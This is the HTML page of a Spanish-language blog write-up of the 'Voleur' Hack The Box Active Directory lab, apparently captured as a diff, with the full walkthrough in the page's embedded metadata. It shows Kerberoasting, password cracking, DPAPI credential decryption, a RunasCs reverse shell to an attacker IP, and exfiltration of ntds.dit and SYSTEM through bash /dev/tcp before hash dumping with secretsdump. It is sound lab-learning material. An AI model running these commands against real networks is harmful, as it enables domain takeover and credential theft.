@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Voleur | Borhub Blog</title>
+<meta name="keywords" content="Medium, ActiveDirectory, NTLM-Deshabilitada, Kerberoasting, RunasCs, Restore-ADObject, DPAPI, WSL, secretsdump">
+<meta name="description" content="Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/voleur/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/voleur/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/voleur/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Voleur">
+  <meta property="og:description" content="Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="NTLM-Deshabilitada">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="RunasCs">
+    <meta property="article:tag" content="Restore-ADObject">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/voleur.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/voleur.png">
+<meta name="twitter:title" content="Voleur">
+<meta name="twitter:description" content="Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Voleur",
+      "item": "https://borhuub.github.io/writeups/voleur/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Voleur",
+  "name": "Voleur",
+  "description": "Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.",
+  "keywords": [
+    "Medium", "ActiveDirectory", "NTLM-Deshabilitada", "Kerberoasting", "RunasCs", "Restore-ADObject", "DPAPI", "WSL", "secretsdump"
+  ],
+  "articleBody": "\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.76 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 22:41 +0200 Initiating SYN Stealth Scan at 22:41 Scanning 10.10.11.76 [65535 ports] Discovered open port 135/tcp on 10.10.11.76 Discovered open port 139/tcp on 10.10.11.76 Discovered open port 445/tcp on 10.10.11.76 Discovered open port 53/tcp on 10.10.11.76 Discovered open port 56867/tcp on 10.10.11.76 Discovered open port 56866/tcp on 10.10.11.76 Discovered open port 3268/tcp on 10.10.11.76 Discovered open port 49667/tcp on 10.10.11.76 Discovered open port 49664/tcp on 10.10.11.76 Discovered open port 2222/tcp on 10.10.11.76 Discovered open port 59455/tcp on 10.10.11.76 Discovered open port 88/tcp on 10.10.11.76 Discovered open port 9389/tcp on 10.10.11.76 Discovered open port 636/tcp on 10.10.11.76 Discovered open port 3269/tcp on 10.10.11.76 Discovered open port 389/tcp on 10.10.11.76 Discovered open port 464/tcp on 10.10.11.76 Discovered open port 56869/tcp on 10.10.11.76 Discovered open port 593/tcp on 10.10.11.76 Discovered open port 5985/tcp on 10.10.11.76 Discovered open port 56892/tcp on 10.10.11.76 Completed SYN Stealth Scan at 22:41, 26.40s elapsed (65535 total ports) Nmap scan report for 10.10.11.76 Host is up, received user-set (0.036s latency). Scanned at 2025-07-05 22:41:11 CEST for 26s Not shown: 65514 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2222/tcp open EtherNetIP-1 syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 56866/tcp open unknown syn-ack ttl 127 56867/tcp open unknown syn-ack ttl 127 56869/tcp open unknown syn-ack ttl 127 56892/tcp open unknown syn-ack ttl 127 59455/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds Raw packets sent: 131061 (5.767MB) | Rcvd: 33 (1.452KB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 2222 ➜ 3268 ➜ 3269 ➜ 5985 ➜ 9389 ➜ 49664 ➜ 49667 ➜ 56866 ➜ 56867 ➜ 56869 ➜ 56892 ➜ 59455 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,56866,56867,56869,56892,59455 10.10.11.76 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 22:45 +0200 Nmap scan report for 10.10.11.76 Host is up (0.067s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-06 04:45:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2222/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA) | 256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA) |_ 256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 56866/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 56867/tcp open msrpc Microsoft Windows RPC 56869/tcp open msrpc Microsoft Windows RPC 56892/tcp open msrpc Microsoft Windows RPC 59455/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2025-07-06T04:46:21 |_ start_date: N/A |_clock-skew: 7h59m49s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.99 seconds Autenticacion NTLM deshabilitada Al intentar comprobar las credenciales recibidas para iniciar la máquina, vemos que nos da como resultado STATUS_NOT_SUPPORTED además de que nos devuelve que NTLM:False.\nEsto quiere decir que o que el usuario tiene la autenticación NTLM deshabilitada o que directamente no se permite la autenticación NTLM en el dominio.\n❯ nxc smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares SMB 10.10.11.76 445 10.10.11.76 [*] x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.76 445 10.10.11.76 [-] 10.10.11.76\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED Entonces sincronizamos nuestra máquina con ntpdate al dominio y luego probamos a autenticarnos mediante kerberos.\nsudo ntpdate -u 10.10.11.76 nxc ldap 10.10.11.76 -k -u 'ryan.naylor' -p 'HollowOct31Nyt' Configuración krb5.conf Parece que vamos a tener que autenticarnos a través de Tickets Garanting Tickets (TGT) , con lo cual vamos a realizar la configuración del archivo krb5.conf para que cuando intentemos auntenticarnos mediante kerberos encuentre el Key Distribution Center (KDC).\nsudo nano /etc/krb5.con [libdefaults] default_realm = VOLEUR.HTB ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false [realms] VOLEUR.HTB = { kdc = DC.voleur.htb admin_server = DC.voleur.htb default_domain = voleur.htb } [domain_realm] .voleur.htb = VOLEUR.HTB voleur.htb = VOLEUR.HTB Una vez configurado el archivo krb5, con la herramienta getTGT.py voy a solicitar el Ticket Garanting Ticket (TGT) para el usuario ryan.naylor, que nos devolverá un ticket en formato .ccache para luego nosotros exportarlo a la variable KRB5CCNAME.\ngetTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.10.11.76 export KRB5CCNAME=/home/borhub/Workspace/HTB/Voleur/CONTENT/ryan.naylor.ccache klist Enumeración SMB + modulo spider_plus - nxc Ahora, vamos a ponerle a la variable FQDN el valor DC.voleur.htb, y luego realizaremos un escaneo a las carpetas comparitdas haciendo uso de nxc y la opción --use-kcache.\nexport FQDN=DC.voleur.htb nxc smb \"$FQDN\" --use-kcache --shares Vemos que tenemos varias carpetas no comunes como Finance, HR y IT, pero solo tenemos permiso de lectura con la carpeta IT, con lo cual vamos a enumerarla con el modulo spider_plus.\nnxc smb \"$FQDN\" --use-kcache --shares -M spider_plus cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json | jq Vemos que dentro de la carpeta tenemos un archivo de excel llamado Acces_Review. Con lo cual nos lo descargamos con nxc usando --get-file.\nnxc smb \"$FQDN\" --use-kcache --share 'IT' --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx Una vez tenemos el archivo nos lo abrimos, pero vemos que el archivo esta encriptado y necesitamos una contraseña para desbloaquearlo.\nExtrayendo y crackeando hash de un archivo protegido xlsx - Jhon Primero haciendo uso del script Office2Jhon extraemos el hash del archivo protegido.\n/opt/Herramientas/john/run/office2john.py Access_Review.xlsx \u003e hash-excel Ahora, vamos a craquear el hash obtenido usando el formato office.\njohn --format=office hash-excel /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Una vez con la contraseña crackeada, desbloqueamos el archivo xlsx y vemos una tabla sobre los usuarios, permisos, estado de los usuarios y incluso algunas contraseñas.\nBloodhound Enumeration Lanzamos el siguiente script de bloodhound-python para recabar toda la información posible del sistema, que luego usaremos en Bloodhound.\nbloodhound-python -u 'ryan.naylor' -k -no-pass -d VOLEUR.HTB -ns 10.10.11.76 -dc DC.voleur.htb -c all --zip --auth-method kerberos Una vez metido los datos en Bloodhound, y habiendo revisado los usuarios visto en el excel. Vemos que el siguiente paso a dar será con svc_ldap del cual ademas tenemos una credencial en el apartado notas.\nComprobamos que las credenciales de svc_ldap sean validas. Y le sacamos un Ticket Garanting Ticket (TGT).\nnxc ldap 10.10.11.76 -k -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76 export KRB5CCNAME=/home/borhub/Workspace/HTB/Voleur/CONTENT/svc_ldap.ccache Una vez con el TGT vamos a proceder a abusar de los permisos GenericWrite sobre el usuario lacey.miller y los permisos WriteSPN sobre svc_winrm lanzando un kerberoast attack.\nKerberoast Attack - tergetedKerberoast.py Lanzamos el comando usando el script targetedKerberoast.py.\n/opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.76 --dc-host DC.voleur.htb -d 'VOLEUR.HTB' -u 'svc_ldap' --no-pass -k Y vemos que tenemos los hashes Ticket Garanting Service (TGS) de los usuarios lacey.miller y de svc_winrm. Ahora, usando hashcat vamos a tratar de crackearlos para obtener ambas contraseñas.\nhashcat hash_tgs /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Vemos que la contraseña crackeada es AFireInsidedeOzarctica980219afi. Y iniciamos sesión a través de winrm. Con lo cual generamos el Ticket Garanting Ticket (TGT) y iniciamos sesión en la máquina.\nEn un principio intente hacer el ataque ShadowCredentials sobre el usuario lacey.miller, pero no estaba funcionando. Con lo cual seguramente el siguiente paso vaya por conseguir restaurar el usuario eliminado Todd.Wolfie que habíamos visto anteriormente en la nota.\nShell como svc_ldap - Runascs.exe Nosotros en este caso tenemos una shell como el usuario svc_winrm , pero desde este usuario no tenemos los permisos Restore Objects que si tiene svc_ldap. Con lo cual haciendo uso de runascs.exe, vamos abrirnos una shell con runascs haciendo uso del usuario ldap.\nRunasCS es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando. Para empezar, vamos a subir a la máquina mediante upload el archivo RunasCs.exe.\n*Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e upload ./RunasCs/RunasCs.exe Luego ejecutamos el siguiente comando:\n.\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.15.254:4444 Restaurando usuario eliminado con Restore-ADObject Ahora con la shell recibida como el usuario svc_ldap, vamos a restaurar el usuario Todd.Wolfe. Primero comprobamos los objetos eliminados con Get-ADObject, entre ellos vemos al usuario que tenemos como objetivo.\nGet-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true} Ahora con el usuario identificado vamos a restaurarlo con Restore-ADObject.\nRestore-ADObject -Identity \"1c6b1deb-c372-4cbb-87b1-15031de169db\" -NewName \"Todd.Wolfe\" Movimiento Lateral - DPAPI Files Luego de estar mirando los permisos de Todd.Wolfe, no encuentro nada interesante es entonces cuando decido lanzar el winPEAS.exe. Luego de estar un rato mirándolo, descubro que existen unas DPAPI Master Key Keys.\nAunque, aquí no nos valen estas credenciales ya que nos falta encontrar el archivo credentials file que es el que contiene las credenciales, con lo cual nos ponemos a enumerar los directorios del sistema. Estas son diferentes rutas donde pueden estar los archivos DPAPI almacenados, pero en este caso no los encontraremos aquí.\nPosibles rutas donde se almacenan:\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Protect\\* C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials* C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Vault\\* También podemos cambiar \\Roaming\\ por \\Local\\ en las rutas. En los directorios del sistema encontramos la carpeta IT en C: y ahí encontraremos el perfil archivado de Todd.Wolfie y los archivos DPAPI que buscábamos.\nC:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110 C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials\\772275FAD58525253490A9B0039791D3 Entonces he probado a descargarme el Masterkey y Credentials files pero me daba el siguiente error:\nYou can’t access this shared folder because your organization’s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\nEsto pasa ya que algunas políticas o por algunas versiones modernas de Windows no permiten la descarga de archivos de manera no autenticada, entonces he establecido un usuario y contraseña y me he conectado al servidor smb haciendo uso de ellas, ya luego he descargado los archivos.\nsudo smbserver.py smbFolder $(pwd) -username borhub -password borhub -smb2support net use x: \\\\10.10.15.254\\smbFolder /user:borhub borhub copy C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110 \\\\10.10.15.254\\smbFolder copy C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials\\772275FAD58525253490A9B0039791D3 \\\\10.10.15.254\\smbFolder\\ Y ahora ya tengo el archivo en mi maquina linux. Entonces procedo a desencryptar el archivo y me da la key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\ndpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110 Ahora tenemos tanto el archivo encryptado como la llave para descifrarlo, vamos a obtener las posibles credenciales que el archivo tenga almacenadas.\ndpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 Es entonces cuando descubrimos las credenciales de jeremy.combs. Y ahora, sacamos un Ticket Garanting Ticket (TGT) para este usuario, ya que hemos visto que tiene permisos de inicio de sesión remota y vamos a enumerar el sistema.\nEscalada de Privilegios Anteriormente habíamos visto que la carpeta IT, estaba dividida en tres carpetas una para cada tipo de técnico.\nSeguramente y como Jeremy es miembro de Third-Line Suppport, tendremos permisos para acceder a la carpeta de su grupo. Dentro de esa carpeta tenemos varios archivos e directorios interesantes. Enumerándolos veo que no tengo permiso para acceder a la carpeta Backups, pero vamos a descargarnos los archivos id_rsa y Note.txt.txt.\nUsando download que nos da evilwinrm, nos los descargamos a nuestra máquina local. Si comprobamos que dice la nota de texto que hemos encontrado, vemos que el admin le dice a Jeremy que ha tenido suficiente con los backups de windows y que ha configurado parcialmente WSL para intentar utilizar alguna de las herramientas de copia de seguridad de Linux.\n[!Subsistema de Windows para Linux] WSL (Subsistema de Windows para Linux) es una característica de Windows que permite ejecutar un entorno Linux en una máquina Windows sin necesidad de una máquina virtual independiente o un dualboot.\nWSL redirige los puertos SSH a los puertos 2222, 22222, 2223. En el escaneo de puertos habíamos visto que el puerto 2222 estaba abierto con lo cual vamos a iniciar sesión por ssh con la clave privada seguramente del usuario svc_backup que se mencionaba en el el archivo excel.\nchmod 600 id_rsa ssh -i id_rsa svc_backup@10.10.11.76 -p 2222 Abusando de WSL parcialmente configurado para obtener archivos sensibles Ahora si hacemos sudo su, vemos que tenemos la capacidad de ponernos como root. Y como WSL monta automáticamente los discos de Windows en /mnt/ vamos a explorarlos.\nPrimero voy a empezar revisando la carpeta Backup a la cual antes no teníamos permiso para acceder. En esa carpeta vemos tanto que tenemos tanto el archivo ntds.din como el archivo SYSTEM.\nntds.dit -\u003e Es el archivo que contiene todos los hashes del dominio. SYSTEM -\u003e Contiene la bootkey (clave maestra) que se usa para descrifrar los hashes almacenados en el archivo ntds.dit. Extracción de hashes NTLM/LM - secretsdump.py Con lo cual nos los descargamos usando los siguientes comandos:\n#Nos transferimos el contenido del ntds.dit a nuestra máquina usando cat y guardandolo en ntds.dit nc -lvnp 4444 \u003e ntds.dit bash -c 'cat ntds.dit \u003e /dev/tcp/10.10.15.254/4444' nc -lvnp 4444 \u003e SYSTEM bash -c 'cat SYSTEM \u003e /dev/tcp/10.10.15.254/4444' Ahora una vez descargados con secretsdump.py extraemos los hashes NTLM/LM.\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL Ahora con el hash NTLM/LM de Administrator le solicitamos el Ticket Garanting Ticket(TGT), lo exportamos y procedemos a iniciar sesión a través de evil-winrm como administradores del sistema.\n",
+  "wordCount" : "2314",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/voleur.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/voleur/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Voleur
+    </h1>
+    <div class="post-description">
+      Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.
+    </div>
+    <div class="post-meta"><span>11 min</span>&nbsp;·&nbsp;<span>2314 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#autenticacion-ntlm-deshabilitada" aria-label="Autenticacion NTLM deshabilitada">Autenticacion NTLM deshabilitada</a><ul>
+                        
+                <li>
+                    <a href="#configuraci%c3%b3n-krb5conf" aria-label="Configuración krb5.conf">Configuración krb5.conf</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-smb--modulo-spider_plus---nxc" aria-label="Enumeración SMB &#43; modulo spider_plus - nxc">Enumeración SMB + modulo spider_plus - nxc</a><ul>
+                        
+                <li>
+                    <a href="#extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon" aria-label="Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon">Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#kerberoast-attack---tergetedkerberoastpy" aria-label="Kerberoast Attack - tergetedKerberoast.py">Kerberoast Attack - tergetedKerberoast.py</a></li>
+                <li>
+                    <a href="#shell-como-svc_ldap---runascsexe" aria-label="Shell como svc_ldap - Runascs.exe">Shell como svc_ldap - Runascs.exe</a></li>
+                <li>
+                    <a href="#restaurando-usuario-eliminado-con-restore-adobject" aria-label="Restaurando usuario eliminado con Restore-ADObject">Restaurando usuario eliminado con Restore-ADObject</a></li></ul>
+                </li>
+                <li>
+                    <a href="#movimiento-lateral---dpapi-files" aria-label="Movimiento Lateral - DPAPI Files">Movimiento Lateral - DPAPI Files</a></li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de Privilegios">Escalada de Privilegios</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles" aria-label="Abusando de WSL parcialmente configurado para obtener archivos sensibles">Abusando de WSL parcialmente configurado para obtener archivos sensibles</a><ul>
+                        
+                <li>
+                    <a href="#extracci%c3%b3n-de-hashes-ntlmlm---secretsdumppy" aria-label="Extracción de hashes NTLM/LM - secretsdump.py">Extracción de hashes NTLM/LM - secretsdump.py</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="Voleur Machine" loading="lazy" src="/img/voleur/voleur_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.76 -oG ports
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
